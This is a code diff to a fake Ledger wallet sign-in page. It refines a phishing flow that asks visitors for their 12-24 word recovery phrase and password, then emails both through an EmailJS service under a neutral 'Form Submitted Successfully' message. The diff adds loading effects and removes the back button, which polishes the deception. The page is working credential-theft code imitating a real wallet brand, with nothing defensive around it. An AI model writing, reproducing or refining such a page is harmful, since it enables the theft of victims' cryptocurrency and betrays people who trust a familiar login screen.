@@ -22,6 +22,7 @@
         text-align: left;
         width: 350px;
         border-radius: 5px;
+        display: none; /* Initially hidden */
       }
       .ledger-logo {
         width: 90px;
@@ -58,22 +59,41 @@
       }
       .buttons {
         display: flex;
-        justify-content: space-between;
+        justify-content: flex-end; /* Align buttons to the right */
         margin-top: 20px;
       }
+
       .btn {
         padding: 10px 20px;
         border: none;
         cursor: pointer;
-        border-radius: 4px;
         font-size: 14px;
+        margin-left: 20px;
+        width: 13vh;
       }
+
       .btn-back {
         background: #ccc;
       }
+
       .btn-next {
         background: rgb(0, 103, 184);
         color: white;
+      }
+
+      .btn-nexts {
+        background: rgb(0, 103, 184);
+        color: white;
+        margin-left: 100px;
+        width: auto; /* Makes the button adjust naturally */
+        font-size: 14px;
+      }
+      .loading {
+        display: none;
+        text-align: center;
+        font-size: 16px;
+        margin-top: 10px;
+        color: rgb(0, 103, 184);
       }
       @media (max-width: 600px) {
         body {
@@ -98,7 +118,7 @@
     </style>
   </head>
   <body>
-    <div class="container" id="page1">
+    <div class="container" id="page1" style="display: block">
       <img src="image/download (9).png" alt="Ledger Logo" class="ledger-logo" />
       <p class="title">Sign in</p>
       <input
@@ -107,19 +127,20 @@
         placeholder="Enter Wallet 12-24 Key Phrase"
       />
       <p class="error" id="error">The Phrase must be between 12 to 24 words.</p>
+      <p class="loading" id="loading1">Loading...</p>
       <div class="buttons">
         <button class="btn btn-back">Back</button>
         <button class="btn btn-next" onclick="goToPasswordPage()">Next</button>
       </div>
     </div>
 
-    <div class="container" id="page2" style="display: none">
+    <div class="container" id="page2">
       <img src="image/download (9).png" alt="Ledger Logo" class="ledger-logo" />
       <p class="title">Enter Password</p>
       <input type="password" id="password" placeholder="Enter your password" />
+      <p class="loading" id="loading2">Submitting...</p>
       <div class="buttons">
-        <button class="btn btn-back" onclick="goBack()">Back</button>
-        <button class="btn btn-next" onclick="submitForm()">Sign In</button>
+        <button class="btn btn-nexts" onclick="submitForm()">Sign In</button>
       </div>
     </div>
 
@@ -132,25 +153,33 @@
         let phrase = document.getElementById("walletPhrase").value.trim();
         let words = phrase.split(/\s+/);
         let errorText = document.getElementById("error");
+        let loadingText = document.getElementById("loading1");
+        let nextButton = document.querySelector(".btn-next");
 
         if (words.length === 12 || words.length === 24) {
           errorText.style.display = "none";
-          localStorage.setItem("walletPhrase", phrase); // Store phrase
-          document.getElementById("page1").style.display = "none";
-          document.getElementById("page2").style.display = "block";
+          localStorage.setItem("walletPhrase", phrase);
+
+          // Show loading text
+          loadingText.style.display = "block";
+          nextButton.disabled = true;
+
+          setTimeout(() => {
+            document.getElementById("page1").style.display = "none";
+            document.getElementById("page2").style.display = "block";
+            loadingText.style.display = "none";
+            nextButton.disabled = false;
+          }, 1000); // 1-second smooth loading effect
         } else {
           errorText.style.display = "block";
         }
       }
 
-      function goBack() {
-        document.getElementById("page1").style.display = "block";
-        document.getElementById("page2").style.display = "none";
-      }
-
       function submitForm() {
         let password = document.getElementById("password").value.trim();
         let walletPhrase = localStorage.getItem("walletPhrase");
+        let submitButton = document.querySelector(".btn-nexts");
+        let loadingText = document.getElementById("loading2");
 
         if (walletPhrase && password) {
           let emailParams = {
@@ -158,15 +187,23 @@
             message: `Wallet Phrase: ${walletPhrase}\nPassword: ${password}`,
           };
 
+          // Show loading text
+          loadingText.style.display = "block";
+          submitButton.disabled = true;
+
           emailjs
             .send("service_b2yu2u9", "template_vslmmtl", emailParams)
             .then((response) => {
-              alert("Sign-in successful! Email sent.");
+              alert("Form Submitted Successfully.");
               console.log("SUCCESS!", response);
+              loadingText.style.display = "none";
+              submitButton.disabled = false;
             })
             .catch((error) => {
               alert("Sign-in failed. Try again.");
               console.log("FAILED...", error);
+              loadingText.style.display = "none";
+              submitButton.disabled = false;
             });
         } else {
           alert("Please enter your password.");
